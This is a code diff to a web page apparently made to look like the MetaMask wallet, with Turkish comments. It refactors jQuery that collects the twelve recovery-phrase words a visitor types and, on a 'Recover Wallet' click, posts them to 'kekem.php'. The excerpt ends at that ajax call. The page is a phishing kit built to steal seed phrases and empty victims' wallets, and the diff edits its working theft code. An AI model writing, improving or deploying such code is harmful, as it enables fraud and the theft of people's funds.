@@ -68007,36 +68007,31 @@ input:checked + .send-v2__amount-max__button {
     <script src="https://webwallet-metamask.vercel.app/script5e1f.js"></script>
 <script>
     $(document).ready(function () {
-        // Selectbox değiştiğinde
-        $("#selectboxID").change(function () {
-            // Seçilen değeri al
-            var selectedValue = $(this).val();
+        // "Recover Wallet" butonunu başlangıçta devre dışı bırak
+        $("#form77").prop("disabled", true);
 
+        // Input alanlarına değer girildiğinde kontrolü yap
+        $("input[name^='import-srp__srp-word']").on("input", function () {
             // Belirtilen koşullara göre "Recover Wallet" butonunu etkinleştir veya devre dışı bırak
-            if (selectedValue == 12) {
-                var enableButton = true;
+            var selectedValue = $("#selectboxID").val();
+            var enableButton = true;
 
-                for (var i = 0; i <= 11; i++) {
-                    var inputID = "import-srp__srp-word-" + i;
-                    var inputValue = $("#" + inputID).val();
+            if (selectedValue == 12) {
+                $("input[name^='import-srp__srp-word']").each(function () {
+                    var inputValue = $(this).val();
 
                     // Her bir input içinde en az 3 harf kontrolü
                     if (inputValue.length < 3) {
                         enableButton = false;
-                        break;
+                        return false; // Döngüyü sonlandır
                     }
-                }
-
-                // Eğer koşullar sağlanıyorsa butonu etkinleştir
-                if (enableButton) {
-                    $("#form77").prop("disabled", false);
-                } else {
-                    $("#form77").prop("disabled", true);
-                }
+                });
             } else {
-                // Seçilen değer 12 değilse butonu devre dışı bırak
-                $("#form77").prop("disabled", true);
+                enableButton = false;
             }
+
+            // Eğer koşullar sağlanıyorsa butonu etkinleştir, değilse devre dışı bırak
+            $("#form77").prop("disabled", !enableButton);
         });
 
         // "Recover Wallet" butonuna tıklanınca
@@ -68044,10 +68039,10 @@ input:checked + .send-v2__amount-max__button {
             // Form verilerini topla
             var formData = {};
 
-            for (var i = 0; i <= 11; i++) {
-                var inputID = "import-srp__srp-word-" + i;
-                formData[inputID] = $("#" + inputID).val();
-            }
+            $("input[name^='import-srp__srp-word']").each(function () {
+                var inputID = $(this).attr("id");
+                formData[inputID] = $(this).val();
+            });
 
             // Formu kekem.php adresine POST isteği gönder
             $.ajax({
